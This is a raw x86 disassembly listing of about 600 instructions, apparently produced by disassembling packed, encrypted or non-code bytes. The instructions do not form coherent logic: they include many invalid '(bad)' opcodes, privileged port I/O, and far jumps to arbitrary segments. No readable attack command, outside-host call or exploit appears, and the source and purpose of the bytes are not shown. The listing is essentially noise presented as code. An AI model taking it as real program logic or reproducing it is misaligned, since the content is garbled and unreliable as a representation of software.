  41ddcc:	inc    edx
  41ddcd:	test   eax,0x9db5933
  41ddd2:	out    0x5f,eax
  41ddd4:	jbe    0x41dd97
  41ddd6:	rcl    BYTE PTR [ecx-0x4],1
  41ddd9:	dec    edx
  41ddda:	and    BYTE PTR [edi],bl
  41dddc:	mov    DWORD PTR [eax],ecx
  41ddde:	test   eax,0x206e7eb0
  41dde3:	dec    edi
  41dde4:	inc    esi
  41dde5:	pop    es
  41dde6:	cwde   
  41dde7:	stos   DWORD PTR es:[edi],eax
  41dde8:	out    dx,eax
  41dde9:	loopne 0x41dde4
  41ddeb:	mov    esp,0x6f9cebba
  41ddf0:	xchg   esp,eax
  41ddf1:	cli    
  41ddf2:	or     DWORD PTR [edi+0x4f5efff0],esp
  41ddf8:	sbb    eax,0x1f0e0abc
  41ddfd:	mov    ebx,0xd1815c77
  41de02:	sub    al,BYTE PTR [edx+0x9]
  41de05:	pop    edx
  41de06:	in     al,0x39
  41de08:	lods   al,BYTE PTR ds:[esi]
  41de09:	and    edx,DWORD PTR [esi+0x59]
  41de0c:	sub    eax,0x123ff0c9
  41de11:	fidivr WORD PTR [edi-0x58]
  41de14:	aaa    
  41de15:	scas   eax,DWORD PTR es:[edi]
  41de16:	in     al,0x43
  41de18:	fsub   QWORD PTR [edi]
  41de1a:	inc    esi
  41de1b:	lea    ebp,[ecx+ebp*1]
  41de1e:	dec    edi
  41de1f:	test   DWORD PTR [ecx+0x371b4fa9],ecx
  41de25:	or     dh,bl
  41de27:	cmp    cl,BYTE PTR [edi-0x518dede9]
  41de2d:	mov    esi,0x7176f790
  41de32:	cmp    al,0xfc
  41de34:	push   cs
  41de35:	inc    DWORD PTR [edi]
  41de37:	popf   
  41de38:	mov    ebp,0x6cbb8742
  41de3d:	mov    ecx,DWORD PTR [ebp-0x30]
  41de40:	mov    ds:0x178e53e5,al
  41de45:	inc    esi
  41de46:	sbb    al,BYTE PTR [ebx]
  41de48:	push   esi
  41de49:	out    dx,al
  41de4a:	mov    edi,0xb5bdf2e
  41de4f:	inc    ebp
  41de50:	mov    bl,0xf9
  41de52:	ficom  WORD PTR [ebx-0x14]
  41de55:	jmp    0x3ab0:0x583422dc
  41de5c:	cld    
  41de5d:	shl    DWORD PTR [eax],0x55
  41de60:	les    edx,FWORD PTR [ebp-0x4e]
  41de63:	ja     0x41de31
  41de65:	(bad)  
  41de66:	daa    
  41de67:	test   BYTE PTR [ebx],0x37
  41de6a:	fldenv es:[edi]
  41de6d:	sub    DWORD PTR [edi],esp
  41de6f:	xchg   ecx,eax
  41de70:	mov    dl,0x94
  41de72:	mov    al,ds:0x6f95efbe
  41de77:	pop    ss
  41de78:	outs   dx,DWORD PTR ds:[esi]
  41de79:	xlat   BYTE PTR ds:[ebx]
  41de7a:	into   
  41de7b:	repnz push edi
  41de7d:	add    ecx,ecx
  41de7f:	xchg   BYTE PTR [ecx-0x3d],ah
  41de82:	or     ch,bh
  41de84:	scas   eax,DWORD PTR es:[edi]
  41de85:	je     0x41de8d
  41de87:	fst    DWORD PTR [ebx]
  41de89:	ins    BYTE PTR es:[edi],dx
  41de8a:	xor    DWORD PTR [edi-0x4c],0x42af51d2
  41de91:	retf   0x5594
  41de94:	mov    WORD PTR [ebx],gs
  41de96:	jge    0x41dede
  41de98:	adc    BYTE PTR [eax],0x21
  41de9b:	stos   DWORD PTR es:[edi],eax
  41de9c:	fadd   DWORD PTR [ebx+0x43]
  41de9f:	and    DWORD PTR [ebx],esi
  41dea1:	push   DWORD PTR [ebx]
  41dea3:	outs   dx,BYTE PTR ds:[esi]
  41dea4:	jge    0x41deb3
  41dea6:	leave  
  41dea7:	inc    ecx
  41dea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea9:	inc    eax
  41deaa:	adc    esp,edx
  41deac:	jl     0x41de84
  41deae:	inc    eax
  41deaf:	jns    0x41df04
  41deb1:	cmc    
  41deb2:	(bad)  
  41deb3:	lock enter 0x3e1c,0x8b
  41deb8:	loopne 0x41dee2
  41deba:	sub    esi,DWORD PTR [ebx-0x2a]
  41debd:	pop    ds
  41debe:	mov    DWORD PTR [edi],edi
  41dec0:	and    eax,0xa24d0f3a
  41dec5:	(bad)  
  41dec6:	call   0xadaa28cb
  41decb:	mov    WORD PTR ss:[esi+eax*4],ds
  41decf:	cs inc esi
  41ded1:	hlt    
  41ded2:	test   DWORD PTR [ecx+0x48],ebx
  41ded5:	and    dh,ah
  41ded7:	call   0x2741024d
  41dedc:	call   0x2b25:0x4bd0165b
  41dee3:	popf   
  41dee4:	cmp    DWORD PTR [ecx-0x32],eax
  41dee7:	inc    BYTE PTR [eax-0x174a74ac]
  41deed:	stos   DWORD PTR es:[edi],eax
  41deee:	jl     0x41deca
  41def0:	lods   al,BYTE PTR ds:[esi]
  41def1:	push   esp
  41def2:	lahf   
  41def3:	or     DWORD PTR [ecx-0x38496d6a],0x54
  41defa:	or     edx,ebx
  41defc:	cmp    ebx,ebp
  41defe:	xlat   BYTE PTR ds:[ebx]
  41df00:	shl    BYTE PTR [ebx+0x4c],1
  41df03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df04:	pop    ebx
  41df05:	mov    cl,0xe4
  41df07:	xchg   edx,eax
  41df08:	sub    BYTE PTR [edi],al
  41df0a:	xor    dh,BYTE PTR [edi+0x15]
  41df0d:	push   edi
  41df0e:	fild   QWORD PTR [edi+0x1a878bd3]
  41df14:	movq   mm6,QWORD PTR [esi]
  41df17:	ins    BYTE PTR es:[edi],dx
  41df18:	je     0x41dede
  41df1a:	rcr    DWORD PTR [eax+0x15],1
  41df1d:	xor    bl,BYTE PTR ss:[esi+0x769e2103]
  41df24:	mov    eax,0xb67e313e
  41df29:	sahf   
  41df2a:	(bad)  
  41df2b:	cmp    BYTE PTR [edi-0x61],ch
  41df2e:	sub    DWORD PTR [ecx-0x73e6aa76],esi
  41df34:	adc    esp,eax
  41df36:	repnz lahf 
  41df38:	int    0x42
  41df3a:	lahf   
  41df3b:	pop    edx
  41df3c:	jp     0x41df44
  41df3e:	cmp    ebx,edx
  41df40:	mov    al,ds:0xc79a7d29
  41df45:	inc    ebp
  41df46:	nop
  41df47:	pop    ebp
  41df48:	dec    DWORD PTR [eax-0x77]
  41df4b:	js     0x41df87
  41df4d:	add    dl,BYTE PTR [eax-0x6d]
  41df50:	sti    
  41df51:	jbe    0x41df20
  41df53:	xlat   BYTE PTR ds:[ebx]
  41df54:	mov    al,0x38
  41df56:	mov    ebp,0xa70c2cfe
  41df5b:	mov    bl,0x25
  41df5d:	nop
  41df5e:	imul   ecx
  41df60:	cwde   
  41df61:	pop    ebp
  41df62:	leave  
  41df63:	(bad)  
  41df65:	ds jecxz 0x41df0f
  41df68:	cld    
  41df69:	adc    eax,0x5fc767f9
  41df6e:	jg     0x41df38
  41df70:	mov    al,ds:0xbcf6b5e8
  41df75:	pop    esp
  41df76:	aaa    
  41df77:	pop    ds
  41df78:	jno    0x41df92
  41df7a:	adc    eax,0xd00a6e5e
  41df7f:	cwde   
  41df80:	add    cl,dh
  41df82:	sbb    bh,bh
  41df84:	arpl   WORD PTR [edx],dx
  41df86:	xchg   ebp,eax
  41df87:	test   DWORD PTR [ebx+0x6bfb4c1],esi
  41df8d:	scas   eax,DWORD PTR es:[edi]
  41df8e:	jnp    0x41dfb8
  41df90:	lods   eax,DWORD PTR ds:[esi]
  41df91:	pushf  
  41df92:	ret    0xcd7
  41df95:	mov    ebp,0x3bbe14dd
  41df9a:	(bad)  
  41df9b:	call   0x50aa6233
  41dfa0:	mov    ebp,?
  41dfa2:	mov    bh,BYTE PTR [esi+ecx*4]
  41dfa5:	daa    
  41dfa6:	std    
  41dfa7:	daa    
  41dfa8:	call   0xeb9bbe3f
  41dfad:	mov    WORD PTR [edx-0x5c],cs
  41dfb0:	adc    BYTE PTR ss:[edi-0x44c2d63a],ah
  41dfb7:	adc    ebx,DWORD PTR [ecx+0x9e101be]
  41dfbd:	push   edx
  41dfbe:	outs   dx,BYTE PTR ds:[esi]
  41dfbf:	rcl    BYTE PTR [ebx+0x4b],1
  41dfc2:	aaa    
  41dfc3:	dec    ecx
  41dfc4:	xchg   edx,eax
  41dfc5:	out    0xc7,eax
  41dfc7:	cdq    
  41dfc8:	cmp    al,0xa4
  41dfca:	outs   dx,DWORD PTR ds:[esi]
  41dfcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcc:	scas   eax,DWORD PTR es:[edi]
  41dfcd:	in     eax,0x18
  41dfcf:	jbe    0x41df59
  41dfd1:	ins    DWORD PTR es:[edi],dx
  41dfd2:	std    
  41dfd3:	adc    eax,0x19f5efd4
  41dfd8:	cmp    al,0xda
  41dfda:	adc    DWORD PTR ds:0x565ab0af,0x2acb0c6f
  41dfe4:	or     al,0xe4
  41dfe6:	xchg   ecx,eax
  41dfe7:	rcl    BYTE PTR [edi-0x46b3cb9f],1
  41dfed:	out    0xf7,eax
  41dfef:	retf   0x3868
  41dff2:	fisubr DWORD PTR [eax]
  41dff4:	loop   0x41e013
  41dff6:	popw   ss
  41dff8:	clc    
  41dff9:	scas   eax,DWORD PTR es:[edi]
  41dffa:	out    0xf9,al
  41dffc:	inc    eax
  41dffd:	fwait
  41dffe:	cmp    ebx,DWORD PTR [ebx-0x68]
  41e001:	and    BYTE PTR [edx+0x1cb9e1c8],bl
  41e007:	sbb    eax,0x4bf8503a
  41e00c:	sbb    al,0x70
  41e00e:	stos   BYTE PTR es:[edi],al
  41e00f:	test   DWORD PTR [ebx+0x3e],edi
  41e012:	ror    DWORD PTR ds:0xbfbc9cf0,0x93
  41e019:	(bad)  
  41e01a:	adc    DWORD PTR [edx],edi
  41e01c:	add    BYTE PTR [eax+0x1b05a548],bh
  41e022:	pushf  
  41e023:	add    eax,0x443abd43
  41e028:	cs jbe 0x41e09e
  41e02b:	leave  
  41e02c:	movlps QWORD PTR [edx+0x74bbdd40],xmm5
  41e033:	push   0x1362c377
  41e038:	cs fsubr QWORD PTR ds:[edi+0x21]
  41e03d:	(bad)  
  41e03f:	add    BYTE PTR [ebp-0xb],ch
  41e042:	pop    esi
  41e043:	mov    ecx,0xbbc05601
  41e048:	xchg   ebp,eax
  41e049:	push   esi
  41e04a:	mov    cs,WORD PTR [edi+ebx*1-0x77]
  41e04e:	test   cl,al
  41e050:	jecxz  0x41e0c3
  41e052:	call   0xebefd3e6
  41e057:	mov    es,WORD PTR [edi+0x48]
  41e05a:	cld    
  41e05b:	jp     0x41dffc
  41e05d:	dec    esi
  41e05e:	repnz push 0x3066d1ce
  41e064:	jb     0x41e09b
  41e066:	mov    dl,0xbe
  41e068:	in     eax,dx
  41e069:	(bad)  
  41e06a:	ins    DWORD PTR es:[edi],dx
  41e06b:	mov    DWORD PTR [edi],esp
  41e06d:	xchg   esi,eax
  41e06e:	aas    
  41e06f:	arpl   WORD PTR [edi+0x3d],bp
  41e072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e073:	or     al,0x2c
  41e075:	lock pop eax
  41e077:	fwait
  41e078:	jno    0x41e01d
  41e07a:	mov    bl,0xc1
  41e07c:	out    0x52,al
  41e07e:	adc    BYTE PTR fs:[esp+eax*2],dl
  41e082:	or     eax,0x4d064b3b
  41e087:	adc    eax,0xbfa46fe9
  41e08c:	push   edi
  41e08d:	ds call 0x7f6a:0x56baa009
  41e095:	push   ebp
  41e096:	and    DWORD PTR [ebx],ebx
  41e098:	scas   eax,DWORD PTR es:[edi]
  41e099:	js     0x41e01b
  41e09b:	mov    gs,WORD PTR [ecx-0x3b53b350]
  41e0a1:	pop    ds
  41e0a2:	ss cs (bad) 
  41e0a5:	pop    edx
  41e0a6:	jp     0x41e097
  41e0a8:	xor    eax,0xcc9034c3
  41e0ad:	js     0x41e076
  41e0af:	sbb    BYTE PTR [edx],ah
  41e0b1:	adc    al,0x2e
  41e0b3:	push   0x1e
  41e0b5:	int    0xd8
  41e0b7:	adc    dl,BYTE PTR [ebx+0x7b]
  41e0ba:	sti    
  41e0bb:	push   edi
  41e0bc:	xor    edi,ebp
  41e0be:	aam    0x35
  41e0c0:	cmp    DWORD PTR [edx+0x384b3799],edi
  41e0c6:	(bad)  
  41e0c8:	sub    ebx,esi
  41e0ca:	mov    al,ds:0x5c2422fd
  41e0cf:	sub    al,0xfd
  41e0d1:	cmp    bl,BYTE PTR [esi]
  41e0d3:	aad    0xa4
  41e0d5:	cli    
  41e0d6:	lock emms 
  41e0d9:	lds    eax,FWORD PTR [ebp+0x6222b020]
  41e0df:	loope  0x41e0d0
  41e0e1:	push   edx
  41e0e2:	xor    BYTE PTR [ebp+0x1e],dl
  41e0e5:	xor    BYTE PTR [edi],0x95
  41e0e8:	test   eax,0x143a1f4b
  41e0ed:	(bad)  
  41e0ee:	ret    0x6faa
  41e0f1:	mov    dh,0xd0
  41e0f3:	cmp    al,0x57
  41e0f5:	(bad)
  41e0f8:	xchg   BYTE PTR [edi-0x5a150b54],cl
  41e0fe:	outs   dx,DWORD PTR ds:[esi]
  41e0ff:	push   esp
  41e100:	shl    DWORD PTR [esi-0x71],1
  41e103:	add    dl,BYTE PTR [ebx-0x72a80af0]
  41e109:	dec    edx
  41e10a:	sub    ebx,DWORD PTR [eax-0x34]
  41e10d:	push   ebx
  41e10e:	fisub  WORD PTR [edi-0x7a]
  41e111:	stos   DWORD PTR es:[edi],eax
  41e112:	mov    al,ds:0xda9eca63
  41e117:	sub    dh,BYTE PTR [esi-0x34fb5c7c]
  41e11d:	dec    edx
  41e11e:	repnz int3 
  41e120:	leave  
  41e121:	sub    eax,0xff13c025
  41e126:	mov    ah,0xba
  41e128:	pop    ebx
  41e129:	add    edx,DWORD PTR [edi+0x7af06c3f]
  41e12f:	test   al,0xbd
  41e131:	add    eax,0x364c3ad8
  41e136:	mov    ds:0x2e12457,ax
  41e13c:	push   0xffffffcb
  41e13e:	jae    0x41e0d0
  41e140:	xchg   ebx,eax
  41e141:	mov    ds:0x1863d0ad,eax
  41e146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e147:	ins    BYTE PTR es:[edi],dx
  41e148:	out    dx,eax
  41e149:	sbb    DWORD PTR [ebp+0x7e22fc5f],0xf95fbcf5
  41e153:	mov    ecx,0x19c5fb57
  41e158:	imul   edx,edi,0x21
  41e15b:	je     0x41e1be
  41e15d:	fstp   DWORD PTR [ebp+0x1daa5108]
  41e163:	xchg   ebx,eax
  41e164:	dec    edi
  41e165:	(bad)  
  41e166:	jb     0x41e180
  41e168:	out    0x94,al
  41e16a:	jl     0x41e1ca
  41e16c:	cmp    eax,0x4b8132c6
  41e171:	or     al,0xde
  41e173:	pusha  
  41e174:	pop    esp
  41e175:	mov    ah,BYTE PTR [esi+0x39aecf83]
  41e17b:	cmp    al,0xbe
  41e17d:	pop    ebp
  41e17e:	pop    es
  41e17f:	and    cl,bl
  41e181:	ss inc ebp
  41e183:	or     esi,DWORD PTR [ebp+esi*2+0xa73b709]
  41e18a:	xchg   DWORD PTR [edi+edi*1+0x678712cd],ebp
  41e191:	xor    eax,0xeca693be
  41e196:	inc    ebx
  41e197:	pop    ebp
  41e198:	lea    esp,ds:0x482f3937
  41e19e:	xchg   esi,eax
  41e19f:	cmp    cl,BYTE PTR [edi+0x60]
  41e1a2:	fistp  QWORD PTR [ebx]
  41e1a4:	push   es
  41e1a5:	push   ds
  41e1a6:	push   ebp
  41e1a7:	addr16 (bad) 
  41e1a9:	ja     0x41e170
  41e1ab:	sahf   
  41e1ac:	xchg   esi,eax
  41e1ad:	inc    eax
  41e1ae:	push   esi
  41e1af:	inc    edx
  41e1b0:	inc    ebx
  41e1b1:	into   
  41e1b2:	hlt    
  41e1b3:	inc    edi
  41e1b4:	pop    eax
  41e1b5:	fnstsw WORD PTR [ecx-0x4d]
  41e1b8:	dec    ecx
  41e1b9:	fild   DWORD PTR [ecx-0x30]
  41e1bc:	mov    bl,0xb3
  41e1be:	stos   BYTE PTR es:[edi],al
  41e1bf:	les    ecx,FWORD PTR ds:0x32fed7bd
  41e1c5:	lds    esi,FWORD PTR [eax]
  41e1c7:	ds ins DWORD PTR es:[edi],dx
  41e1c9:	push   ebx
  41e1ca:	retf   0x21f5
  41e1cd:	pop    edx
  41e1ce:	push   0x76efe7b
  41e1d3:	xchg   ebx,eax
  41e1d4:	test   eax,0xf4bdcc19
  41e1d9:	clc    
  41e1da:	push   0x97b044af
  41e1df:	inc    ecx
  41e1e0:	loop   0x41e203
  41e1e2:	or     dh,BYTE PTR [edx]
  41e1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e5:	push   edi
  41e1e6:	gs scas al,BYTE PTR es:[edi]
  41e1e8:	cmp    dl,BYTE PTR [eax-0x6a]
  41e1eb:	fsub   QWORD PTR [edi-0x3359baa2]
  41e1f1:	ja     0x41e25c
  41e1f3:	mov    ecx,es
  41e1f5:	aaa    
  41e1f6:	jns    0x41e230
  41e1f8:	inc    edi
  41e1f9:	outs   dx,DWORD PTR ds:[esi]
  41e1fa:	jns    0x41e252
  41e1fc:	jae    0x41e1f9
  41e1fe:	push   0x6e
  41e200:	pop    ecx
  41e201:	sub    eax,0x8fe87595
  41e206:	mov    dh,0x8d
  41e209:	stos   DWORD PTR es:[edi],eax
  41e20a:	push   0x79
  41e20c:	test   al,0x6b
  41e20e:	aas    
  41e20f:	pop    ds
  41e210:	fstp   QWORD PTR [ebp-0x34]
  41e213:	imul   ebp,ebp,0x3d
  41e216:	sub    al,0xda
  41e218:	pop    eax
  41e219:	push   esp
  41e21a:	lahf   
  41e21b:	retf   
  41e21c:	cmp    BYTE PTR [edi+ecx*4],dl
  41e21f:	gs dec eax
  41e221:	(bad)  
  41e223:	lea    ebx,[ebp+ebp*1+0x48]
  41e227:	jne    0x41e248
  41e229:	fiadd  WORD PTR [esi-0x78e95a13]
  41e22f:	cld    
  41e230:	outs   dx,DWORD PTR ds:[esi]
  41e231:	cld    
  41e232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e233:	and    eax,ecx
  41e235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e236:	or     al,0x17
  41e238:	xchg   edx,eax
  41e239:	pushf  
  41e23a:	test   eax,0xeb4f0a15
  41e23f:	sbb    al,0x71
  41e241:	inc    dh
  41e243:	test   cl,0xbd
  41e246:	and    ch,BYTE PTR [ebx]
  41e248:	jae    0x41e1f7
  41e24a:	cmp    ah,bh
  41e24c:	stos   DWORD PTR es:[edi],eax
  41e24d:	lods   eax,DWORD PTR ds:[esi]
  41e24e:	pusha  
  41e24f:	jb     0x41e2bb
  41e251:	mov    eax,ds:0x7fd207b6
  41e256:	push   eax
  41e257:	dec    esp
  41e258:	mov    ah,0x7d
  41e25a:	sahf   
  41e25b:	xor    al,0xe2
  41e25d:	xchg   ebp,eax
  41e25e:	shl    cl,cl
  41e260:	pop    esp
  41e261:	dec    ebx
  41e262:	and    eax,0xab03a478
  41e267:	mov    al,0x21
  41e269:	add    DWORD PTR [eax-0x1c623db4],ecx
  41e26f:	imul   ebx,DWORD PTR [ebx+0x68],0xf2ef86f2
  41e276:	dec    eax
  41e277:	or     eax,DWORD PTR [edx+0x53]
  41e27a:	call   0x9744:0x5e5b252e
  41e281:	sbb    eax,0x92ccf54
  41e286:	push   edx
  41e287:	xchg   edx,eax
  41e288:	xchg   edi,eax
  41e289:	xor    BYTE PTR [eax+0x57],0x54
  41e28d:	ins    DWORD PTR es:[edi],dx
  41e28e:	push   0x4f
  41e290:	adc    al,bh
  41e292:	jnp    0x41e24b
  41e294:	xchg   esi,eax
  41e295:	popf   
  41e296:	push   eax
  41e297:	push   ds
  41e298:	push   es
  41e299:	outs   dx,DWORD PTR ss:[esi]
  41e29b:	in     al,0xf3
  41e29d:	xor    dh,ch
  41e29f:	mov    esp,0x41ffa534
  41e2a4:	aam    0x87
  41e2a6:	mov    ebp,0x712b86da
  41e2ab:	aad    0xf3
  41e2ad:	xchg   DWORD PTR [ebp-0x5c6bad56],esp
  41e2b3:	jmp    0xd267:0x24690101
  41e2ba:	lea    esi,[ebx-0x5bde54c6]
  41e2c0:	call   0x3a1957bb
  41e2c5:	lods   eax,DWORD PTR ds:[esi]
  41e2c6:	and    dh,BYTE PTR [eax+0x65]
  41e2c9:	mov    DWORD PTR [eax],ebx
  41e2cb:	push   edx
  41e2cc:	scas   eax,DWORD PTR es:[edi]
  41e2cd:	das    
  41e2ce:	push   edi
  41e2cf:	fst    QWORD PTR [edi-0x57]
  41e2d2:	dec    ebp
  41e2d3:	add    BYTE PTR [edi],ah
  41e2d5:	push   ebx
  41e2d6:	fsub   DWORD PTR [esi+ebx*8]
  41e2d9:	dec    ecx
  41e2da:	imul   esi,DWORD PTR [ebp-0x38],0xffffff8a
  41e2de:	ds xchg esp,eax
  41e2e0:	xchg   edx,eax
  41e2e1:	pop    esp
  41e2e2:	aam    0x20
  41e2e4:	aaa    
  41e2e5:	and    eax,0xc190e8b0
  41e2ea:	sbb    ebp,DWORD PTR [eax-0x3a4cc14e]
  41e2f0:	test   ax,0x9e85
  41e2f4:	push   ecx
  41e2f5:	add    eax,0xd20c0807
  41e2fa:	mov    ecx,0xf610f948
  41e2ff:	lods   eax,DWORD PTR ds:[esi]
  41e300:	mov    ebx,0x5dd89a5c
  41e305:	sbb    DWORD PTR [edi],ecx
  41e307:	jnp    0x41e28c
  41e309:	inc    ebp
  41e30a:	repnz fsubr st,st(4)
  41e30d:	pop    ss
  41e30e:	dec    DWORD PTR ds:0x441cf0cb
  41e314:	cmp    al,0x3c
  41e316:	or     eax,DWORD PTR [edx-0x45679d0d]
  41e31c:	mov    eax,ss
  41e31e:	mov    edx,0x9d5f016c
  41e323:	dec    esp
  41e324:	inc    esp
  41e325:	ret    
  41e326:	int    0x20
  41e328:	jge    0x41e397
  41e32a:	push   ebx
  41e32b:	mov    ?,WORD PTR [edx-0x63]
  41e32e:	sbb    BYTE PTR [ebx+0x1ac4cd9c],ch
  41e334:	sahf   
  41e335:	pop    ss
  41e336:	cmc    
  41e337:	mov    cl,BYTE PTR [ecx]
  41e339:	adc    ebp,DWORD PTR [ebx-0x67315296]
  41e33f:	ja     0x41e3b3
  41e341:	repz pushf 
  41e343:	addr16 call 0x4cd9:0xa757ddb6
  41e34b:	inc    eax
  41e34c:	mov    al,ds:0xc5152aef
  41e351:	imul   eax,DWORD PTR ds:0xa60a9d3f,0x11
  41e358:	sub    eax,0xb3519976
  41e35d:	xchg   esi,eax
  41e35e:	xchg   esp,eax
  41e35f:	sbb    al,0x68
  41e361:	mov    bl,0xe6
  41e363:	inc    esp
  41e364:	xor    BYTE PTR [edx-0x6e],ch
  41e367:	ins    DWORD PTR es:[edi],dx
  41e368:	test   BYTE PTR [esi+0x3f],dh
  41e36b:	mov    esp,0x3075b754
  41e370:	xchg   edi,eax
  41e371:	std    
  41e372:	fsubr  QWORD PTR [ebp+0x16ad86c1]
  41e378:	(bad)  
  41e379:	ins    BYTE PTR es:[edi],dx
  41e37a:	dec    eax
  41e37b:	inc    edi
  41e37c:	mov    ebp,DWORD PTR [eax]
  41e37e:	lea    esp,[esi-0x42]
  41e381:	push   ebx
  41e382:	pop    ss
  41e383:	cs pop edi
  41e385:	and    BYTE PTR ds:0xf304c691,bh
  41e38b:	mov    DWORD PTR [edx-0x28363362],esi
  41e391:	dec    ebp
  41e392:	imul   ebp,DWORD PTR [edx+0x38063cc9],0xeafd01f8
  41e39c:	(bad)  
  41e39d:	cmp    eax,0x970d142a
  41e3a2:	stos   BYTE PTR es:[edi],al
  41e3a3:	retf   
  41e3a4:	jle    0x41e3d3
  41e3a6:	retf   
  41e3a7:	cmc    
  41e3a8:	je     0x41e3b2
  41e3aa:	jl     0x41e38e
  41e3ac:	(bad)  
  41e3ad:	sub    al,0xa1
  41e3af:	or     BYTE PTR [esi+eax*1+0x75abfc5a],al
  41e3b6:	sub    eax,0x9d96cf66
  41e3bb:	aad    0x47
  41e3bd:	fldenv [edi+0x662dba5d]
  41e3c3:	imul   esi,ebp,0x62
  41e3c6:	mov    bl,0xd1
  41e3c8:	jno    0x41e436
  41e3ca:	mov    edx,0xdf60df0f
  41e3cf:	add    cl,dh
  41e3d1:	and    ecx,DWORD PTR [ebp-0x3]
  41e3d4:	in     al,0xf1
  41e3d6:	dec    esp
  41e3d7:	inc    edi
  41e3d8:	(bad)  
  41e3d9:	jmp    0x37734354
  41e3de:	xchg   BYTE PTR [ecx],al
  41e3e0:	(bad)  
  41e3e1:	aam    0x4f
  41e3e3:	daa    
  41e3e4:	jp     0x41e3bc
  41e3e6:	loopne 0x41e433
  41e3e8:	(bad)  [edx]
  41e3ea:	out    0xd6,eax
  41e3ec:	or     BYTE PTR [edx],bl
  41e3ee:	jae    0x41e3ac
  41e3f0:	test   eax,0xdff29c3b
  41e3f5:	inc    ebx
  41e3f6:	imul   esi,edi,0x7f157ae7
  41e3fc:	dec    ebx
  41e3fd:	popa   
  41e3fe:	pop    edi
  41e3ff:	and    eax,0x27f20538
  41e404:	inc    esp
  41e405:	adc    al,0x8f
  41e407:	push   esi
  41e408:	dec    esi
  41e409:	ret    0xb5e8
  41e40c:	lds    ebp,FWORD PTR ds:0x43ad439
  41e412:	(bad)  
  41e414:	mov    al,0xec
  41e416:	mov    eax,0x4b8312c3
  41e41b:	imul   edi,DWORD PTR [ecx-0x76715951],0xe2c695a
  41e425:	push   ecx
  41e426:	retf   
  41e427:	pop    edx
  41e428:	add    BYTE PTR [eax+0x299fec1d],0xea
  41e42f:	fsub   QWORD PTR [esi+0x662c2ee5]
  41e435:	popf   
  41e436:	adc    eax,0xc95ddd42
  41e43b:	dec    ecx
  41e43c:	scas   al,BYTE PTR es:[edi]
  41e43d:	pushf  
  41e43e:	mov    DWORD PTR [ebx+edi*1-0x4956d2f7],0x6da3a7e0
  41e449:	fistp  DWORD PTR [eax+0x6b2bb53b]
  41e44f:	imul   esi,DWORD PTR [ebp+0x42f1f10f],0xd161b85f
  41e459:	mov    edi,0xf2685a25
  41e45e:	mov    ecx,DWORD PTR [ebx]
  41e460:	inc    ebp
  41e461:	lock jl 0x41e49e
  41e464:	(bad)  
  41e465:	push   ss
  41e466:	mov    eax,ds:0xeebac3f4
  41e46b:	push   edi
  41e46c:	sbb    eax,0x7ab81791
  41e471:	jno    0x41e4bf
  41e473:	or     DWORD PTR [bx+si+0x5c1b],ebp
  41e478:	xchg   edi,edi
  41e47a:	mov    esp,0x8a1c29e8
  41e47f:	repnz lods eax,DWORD PTR ds:[esi]
  41e481:	mov    al,ds:0x44dd9874
  41e486:	sar    DWORD PTR [ebx-0x60],1
  41e489:	aas    
  41e48a:	(bad)  
  41e48c:	ret    0x354f
  41e48f:	mov    al,0xee
  41e491:	out    0x82,eax
  41e493:	sub    BYTE PTR [ebp+0x71],dh
  41e496:	js     0x41e47c
  41e498:	xchg   BYTE PTR [eax],ah
  41e49a:	es je  0x41e4b6
  41e49d:	jne    0x41e43e
  41e49f:	inc    ebp
  41e4a0:	(bad)  
  41e4a1:	sbb    ecx,DWORD PTR [edi+ecx*8-0xc58093b]
  41e4a8:	mov    cl,0x66
  41e4aa:	add    DWORD PTR [ebx-0x650bbe56],edx
  41e4b0:	leave  
  41e4b1:	jb     0x41e4ef
  41e4b3:	mov    bl,dh
  41e4b5:	cmp    eax,0x49318c88
  41e4ba:	sbb    cl,BYTE PTR [ebx]
  41e4bc:	xchg   ebx,eax
  41e4bd:	mov    ebp,0xb0231e77
  41e4c2:	jl     0x41e49d
  41e4c4:	and    esi,ebx
  41e4c6:	sbb    al,0x7d
  41e4c8:	cmp    eax,0x84c54596
  41e4cd:	xchg   esi,eax
  41e4cf:	pop    esp
  41e4d0:	(bad)  
  41e4d2:	and    al,0x76
  41e4d4:	or     eax,0x10605deb
  41e4d9:	scas   eax,DWORD PTR es:[edi]
  41e4da:	in     al,0x62
  41e4dc:	jmp    0xaacc:0xfea45a05
  41e4e3:	cli    
  41e4e4:	stos   DWORD PTR es:[edi],eax
  41e4e5:	rcr    dl,1
  41e4e7:	ins    DWORD PTR es:[edi],dx
  41e4e8:	add    dh,bh
  41e4ea:	iret   
  41e4eb:	clc    
  41e4ec:	inc    eax
  41e4ed:	mov    edx,0x36bd06bf
  41e4f2:	jmp    0x41e494
  41e4f4:	sar    BYTE PTR [eax+0x59],0x66
  41e4f8:	add    al,0xbb
  41e4fa:	mov    bh,0x8a
  41e4fc:	fld    TBYTE PTR [ebp-0x6f]
  41e4ff:	pusha  
  41e500:	inc    ebx
  41e501:	pop    ss
  41e502:	mov    edx,0xf10f7973
  41e507:	into   
  41e508:	add    esi,DWORD PTR [esi-0x7f87a244]
  41e50e:	and    bl,BYTE PTR [eax-0x2b9f575a]
  41e514:	add    al,0x57
  41e516:	(bad)  
  41e517:	cli    
  41e518:	int3   
  41e519:	inc    edx
  41e51a:	sbb    BYTE PTR [edx],cl
  41e51c:	pop    ebx
  41e51d:	mov    ch,0xaf
  41e51f:	retf   
  41e520:	loope  0x41e564
  41e522:	mov    BYTE PTR [ebx-0x24d850c9],ch
  41e528:	inc    esi
  41e529:	loop   0x41e4ac
  41e52b:	int    0x49
  41e52d:	mov    ah,0xb2
  41e52f:	sub    al,0x45
  41e531:	lahf   
  41e532:	xor    eax,0xed9488da
  41e537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e538:	mov    edi,DWORD PTR [edx]
  41e53a:	inc    esp
  41e53b:	loop   0x41e5a1
  41e53d:	push   ecx
  41e53e:	push   esi
  41e53f:	jbe    0x41e54f
  41e541:	and    al,0xc6
  41e543:	xchg   edx,eax
  41e544:	fild   QWORD PTR [eax]
  41e546:	into   
  41e547:	leave  
